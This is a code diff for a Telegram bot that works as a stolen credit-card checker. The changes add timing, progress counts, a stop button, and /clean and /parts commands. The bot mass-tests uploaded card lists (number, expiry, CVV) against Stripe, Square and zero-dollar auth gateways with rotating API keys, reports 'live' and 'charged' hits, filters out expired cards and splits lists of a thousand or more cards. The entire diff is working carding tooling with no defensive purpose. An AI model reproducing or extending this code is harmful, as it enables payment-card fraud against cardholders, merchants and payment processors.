+⏱ Time: <code>{taken}s</code>
+💬 Response: <code>{response}</code>
+- - - - - - - - - - - - - - - -
 🔥 Charge: <code>{approved}</code>
 💵 Live: <code>{live}</code>
 ❌ Declined: <code>{declined}</code>
-📊 Total: <code>{approved + live + declined}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💳 Card #{card_counter}: <code>{card_full}</code>
-🌐 Gateway: <code>{gateway_name}</code>
-⚡ Response: <code>{response}</code>"""
+- - - - - - - - - - - - - - - -
+💳 Card: <code>{card_full}</code>
+- - - - - - - - - - - - - - - -
+📊 Total: <code>{card_counter}/{total_cards}</code>"""
             try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
                 pass
             
             await asyncio.sleep(1)
         
-        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete."), parse_mode="HTML")
+        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete!\n📊 Total: {card_counter} | 🔥 {approved} | 💵 {live} | ❌ {declined}"), parse_mode="HTML")
         
     except asyncio.CancelledError:
         await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
@@ -1589,16 +1608,25 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
         card_counter = 0
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Stripe Checking..."), parse_mode="HTML")
         loop = asyncio.get_event_loop()
-        with open(file_path, 'r', encoding='utf-8') as f:
-            lines = f.readlines()
-        for line in lines:
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            all_cards = f.readlines()
+        
+        valid_cards = []
+        for line in all_cards:
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if match:
+                valid_cards.append(match[0])
+        
+        total_cards = len(valid_cards)
+        
+        for card_full in valid_cards:
             if stop_users.get(user_id):
                 await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                 return
-            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-            if not match: continue
-            card_full = match[0]
+            
             card_counter += 1
+            start_time = time.time()
             keys_list = list(STRIPE_KEYS.keys())
             total_keys = len(keys_list)
             if total_keys == 0:
@@ -1606,10 +1634,11 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
                 return
             key_id = keys_list[(card_counter - 1) % total_keys]
             result = await loop.run_in_executor(None, check_stripe_sync, card_full, key_id)
+            taken = round(time.time() - start_time, 2)
             result_upper = str(result).upper()
             if "CHARGE" in result_upper:
                 approved += 1
-                text = await format_stripe_response(card_full, result, 0, user_id, "Mass")
+                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 try:
                     await msg.pin(disable_notification=True)
@@ -1620,26 +1649,30 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
                 live += 1
-                text = await format_stripe_response(card_full, result, 0, user_id, "Mass")
+                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 hit_counter += 1
                 status_text = "💵 Insufficient Funds"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             else:
                 declined += 1
-            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-         ▬▬ [ MASS STRIPE ] ▬▬
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+            
+            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
+            
+            panel = f"""⚡ {gateway_name}
+🔑 Key #{key_id}
+⏱ Time: <code>{taken}s</code>
+💬 Result: <code>{result[:80]}</code>
+- - - - - - - - - - - - - - - -
 🔥 Charge: <code>{approved}</code>
 💵 Live: <code>{live}</code>
 ❌ Declined: <code>{declined}</code>
-📊 Total: <code>{approved + live + declined}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💳 Card #{card_counter}: <code>{card_full}</code>
-🔑 Key: <code>{key_id}</code>
-⚡ Result: <code>{result[:80]}</code>"""
+- - - - - - - - - - - - - - - -
+💳 Card: <code>{card_full}</code>
+- - - - - - - - - - - - - - - -
+📊 Total: <code>{card_counter}/{total_cards}</code>"""
             try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
                 pass
             await asyncio.sleep(1)
@@ -1658,20 +1691,30 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
         card_counter = 0
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Square Checking..."), parse_mode="HTML")
         loop = asyncio.get_event_loop()
-        with open(file_path, 'r', encoding='utf-8') as f:
-            lines = f.readlines()
-        for line in lines:
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            all_cards = f.readlines()
+        
+        valid_cards = []
+        for line in all_cards:
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if match:
+                valid_cards.append(match[0])
+        
+        total_cards = len(valid_cards)
+        
+        for card_full in valid_cards:
             if stop_users.get(user_id):
                 await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                 return
-            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-            if not match: continue
-            card_full = match[0]
+            
             card_counter += 1
+            start_time = time.time()
             result = await loop.run_in_executor(None, check_square_sync, card_full)
+            taken = round(time.time() - start_time, 2)
             if "CHARGE" in result:
                 approved += 1
-                text = await format_square_response(card_full, result, 0, user_id, "Mass")
+                text = await format_square_response(card_full, result, taken, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 try:
                     await msg.pin(disable_notification=True)
@@ -1682,25 +1725,29 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             elif "LIVE" in result:
                 live += 1
-                text = await format_square_response(card_full, result, 0, user_id, "Mass")
+                text = await format_square_response(card_full, result, taken, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 hit_counter += 1
                 status_text = "💵 Insufficient Funds"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
             else:
                 declined += 1
-            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-         ▬▬ [ MASS SQUARE ] ▬▬
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+            
+            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
+            
+            panel = f"""⚡ {gateway_name}
+⏱ Time: <code>{taken}s</code>
+💬 Result: <code>{result}</code>
+- - - - - - - - - - - - - - - -
 🔥 Charge: <code>{approved}</code>
 💵 Live: <code>{live}</code>
 ❌ Declined: <code>{declined}</code>
-📊 Total: <code>{approved + live + declined}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💳 Card #{card_counter}: <code>{card_full}</code>
-⚡ Result: <code>{result}</code>"""
+- - - - - - - - - - - - - - - -
+💳 Card: <code>{card_full}</code>
+- - - - - - - - - - - - - - - -
+📊 Total: <code>{card_counter}/{total_cards}</code>"""
             try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
                 pass
             await asyncio.sleep(2)
@@ -1719,21 +1766,31 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
         card_counter = 0
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
         loop = asyncio.get_event_loop()
-        with open(file_path, 'r', encoding='utf-8') as f:
-            lines = f.readlines()
-        for line in lines:
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            all_cards = f.readlines()
+        
+        valid_cards = []
+        for line in all_cards:
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if match:
+                valid_cards.append(match[0])
+        
+        total_cards = len(valid_cards)
+        
+        for card_full in valid_cards:
             if stop_users.get(user_id):
                 await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                 return
-            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-            if not match: continue
-            card_full = match[0]
+            
             card_counter += 1
+            start_time = time.time()
             result_dict = await loop.run_in_executor(None, check_auth_sync, card_full)
+            taken = round(time.time() - start_time, 2)
             status = result_dict.get('status', 'declined')
             if status == "approved":
                 approved += 1
-                text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
+                text = await format_auth_response(card_full, result_dict, taken, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 try:
                     await msg.pin(disable_notification=True)
@@ -1744,7 +1801,7 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
                 await send_hit(context, chat_id, hit_counter, username, status_text, result_dict.get('message', ''), gateway_name)
             elif status == "live":
                 live += 1
-                text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
+                text = await format_auth_response(card_full, result_dict, taken, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 hit_counter += 1
                 status_text = "💵 Insufficient Funds"
@@ -1752,18 +1809,22 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
             else:
                 declined += 1
             message = result_dict.get('message', '')
-            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-         ▬▬ [ MASS AUTH ] ▬▬
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+            
+            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
+            
+            panel = f"""⚡ {gateway_name}
+⏱ Time: <code>{taken}s</code>
+💬 Result: <code>{message[:80]}</code>
+- - - - - - - - - - - - - - - -
 🔥 Approved: <code>{approved}</code>
 💵 Live: <code>{live}</code>
 ❌ Declined: <code>{declined}</code>
-📊 Total: <code>{approved + live + declined}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💳 Card #{card_counter}: <code>{card_full}</code>
-⚡ Result: <code>{message[:80]}</code>"""
+- - - - - - - - - - - - - - - -
+💳 Card: <code>{card_full}</code>
+- - - - - - - - - - - - - - - -
+📊 Total: <code>{card_counter}/{total_cards}</code>"""
             try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
                 pass
             await asyncio.sleep(1)
@@ -1773,10 +1834,214 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
+async def stop_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer("🛑 Stopping...")
+    user_id = int(query.data.split("_")[2])
+    stop_users[user_id] = True
+    await query.edit_message_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")
+
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = True
     await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")
+
+async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    ALL_USERS.add(user_id)
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        await update.message.reply_text(premium_emoji("💡 Reply to a file with /clean"), parse_mode="HTML")
+        return
+    
+    msg = await update.message.reply_text(premium_emoji("🧹 Cleaning cards..."), parse_mode="HTML")
+    
+    try:
+        file = await update.message.reply_to_message.document.get_file()
+        file_path = f"downloads/clean_{user_id}_{int(time.time())}.txt"
+        await file.download_to_drive(file_path)
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+        
+        total_lines = len(lines)
+        valid_cards = []
+        removed = 0
+        
+        current_year = datetime.now().year % 100
+        current_month = datetime.now().month
+        
+        for line in lines:
+            line = line.strip()
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if not match:
+                removed += 1
+                continue
+            
+            card = match[0]
+            parts = card.split("|")
+            if len(parts) < 4:
+                removed += 1
+                continue
+            
+            try:
+                exp_month = int(parts[1])
+                exp_year = int(parts[2])
+                if exp_year < 100:
+                    exp_year += 2000
+                
+                if exp_month < 1 or exp_month > 12:
+                    removed += 1
+                    continue
+                
+                if exp_year < datetime.now().year:
+                    removed += 1
+                    continue
+                elif exp_year == datetime.now().year and exp_month < current_month:
+                    removed += 1
+                    continue
+                
+                valid_cards.append(card)
+            except:
+                removed += 1
+                continue
+        
+        clean_file_path = f"downloads/clean_result_{user_id}_{int(time.time())}.txt"
+        with open(clean_file_path, 'w', encoding='utf-8') as f:
+            for card in valid_cards:
+                f.write(card + "\n")
+        
+        private_count = len(valid_cards)
+        private_percentage = (private_count / total_lines * 100) if total_lines > 0 else 0
+        
+        result_text = f"""🧹 Clean Complete!
+- - - - - - - - - - - - - - - -
+📊 Total cards: <code>{total_lines}</code>
+✅ Private: <code>{private_count}</code>
+❌ Public/Removed: <code>{removed}</code>
+📈 Private percentage: <code>{private_percentage:.1f}%</code>
+- - - - - - - - - - - - - - - -
+🧹 Removed: <code>{removed}</code>
+✅ Kept: <code>{private_count}</code>
+- - - - - - - - - - - - - - - -
+🤖 checker v1"""
+        
+        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
+        
+        if private_count > 0:
+            with open(clean_file_path, 'rb') as f:
+                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"✅ Cleaned Cards ({private_count})"), parse_mode="HTML")
+        
+        try:
+            os.remove(file_path)
+            os.remove(clean_file_path)
+        except:
+            pass
+        
+    except Exception as e:
+        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
+
+async def parts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    ALL_USERS.add(user_id)
+    
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        await update.message.reply_text(premium_emoji("💡 Reply to a file with /parts [number]"), parse_mode="HTML")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(premium_emoji("💡 Usage: <code>/parts [number]</code>"), parse_mode="HTML")
+        return
+    
+    try:
+        num_parts = int(context.args[0])
+        if num_parts < 2:
+            await update.message.reply_text(premium_emoji("❌ Minimum parts is 2"), parse_mode="HTML")
+            return
+    except:
+        await update.message.reply_text(premium_emoji("❌ Invalid number"), parse_mode="HTML")
+        return
+    
+    msg = await update.message.reply_text(premium_emoji("📁 Splitting file..."), parse_mode="HTML")
+    
+    try:
+        file = await update.message.reply_to_message.document.get_file()
+        file_path = f"downloads/parts_{user_id}_{int(time.time())}.txt"
+        await file.download_to_drive(file_path)
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+        
+        valid_cards = []
+        for line in lines:
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if match:
+                valid_cards.append(match[0])
+        
+        total_cards = len(valid_cards)
+        
+        if total_cards < 1000:
+            await msg.edit_text(premium_emoji(f"❌ Minimum file for split is 1000 cards!\n📊 Your file: {total_cards} cards"), parse_mode="HTML")
+            try:
+                os.remove(file_path)
+            except:
+                pass
+            return
+        
+        cards_per_part = total_cards // num_parts
+        if cards_per_part < 1:
+            await msg.edit_text(premium_emoji("❌ Too many parts for this file"), parse_mode="HTML")
+            try:
+                os.remove(file_path)
+            except:
+                pass
+            return
+        
+        username = update.effective_user.username or update.effective_user.first_name or "Unknown"
+        
+        result_text = f"""📁 Parts Complete!
+- - - - - - - - - - - - - - - -
+⚡ Parts: <code>{num_parts}</code>
+⚡ Lines per part: <code>{cards_per_part}</code>
+⚡ Total cards: <code>{total_cards}</code>
+- - - - - - - - - - - - - - - -
+⚡ By: @{username}
+- - - - - - - - - - - - - - - -
+🤖 checker v1"""
+        
+        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
+        
+        for i in range(num_parts):
+            start_idx = i * cards_per_part
+            end_idx = start_idx + cards_per_part if i < num_parts - 1 else total_cards
+            part_cards = valid_cards[start_idx:end_idx]
+            
+            part_file_path = f"downloads/part_{i+1}_{user_id}_{int(time.time())}.txt"
+            with open(part_file_path, 'w', encoding='utf-8') as f:
+                for card in part_cards:
+                    f.write(card + "\n")
+            
+            with open(part_file_path, 'rb') as f:
+                await context.bot.send_document(
+                    chat_id=update.effective_chat.id,
+                    document=f,
+                    caption=premium_emoji(f"📁 Part {i+1}/{num_parts} - {len(part_cards)} cards"),
+                    parse_mode="HTML"
+                )
+            
+            try:
+                os.remove(part_file_path)
+            except:
+                pass
+            
+            await asyncio.sleep(1)
+        
+        try:
+            os.remove(file_path)
+        except:
+            pass
+        
+    except Exception as e:
+        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -1930,6 +2195,8 @@ def main():
     app.add_handler(CommandHandler("rmprm", remove_prm))
     app.add_handler(CommandHandler("addkey", add_stripe_key))
     app.add_handler(CommandHandler("rmkey", remove_stripe_key))
+    app.add_handler(CommandHandler("clean", clean_command))
+    app.add_handler(CommandHandler("parts", parts_command))
     
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file_panel))
     
@@ -1941,6 +2208,8 @@ def main():
     app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
     app.add_handler(CallbackQueryHandler(check_square_callback, pattern="^check_square$"))
     app.add_handler(CallbackQueryHandler(check_auth_callback, pattern="^check_auth$"))
+    app.add_handler(CallbackQueryHandler(clean_panel_callback, pattern="^clean_panel$"))
+    app.add_handler(CallbackQueryHandler(parts_panel_callback, pattern="^parts_panel$"))
     app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
     app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
     app.add_handler(CallbackQueryHandler(gate_info_callback, pattern="^gate_info_"))
@@ -1948,6 +2217,7 @@ def main():
     app.add_handler(CallbackQueryHandler(back_to_gateways_callback, pattern="^back_to_gateways$"))
     app.add_handler(CallbackQueryHandler(close_gateways_callback, pattern="^close_gateways$"))
     app.add_handler(CallbackQueryHandler(gateway_callback, pattern="^gateway_"))
+    app.add_handler(CallbackQueryHandler(stop_mass_callback, pattern="^stop_mass_"))
     
     app.run_polling()
 
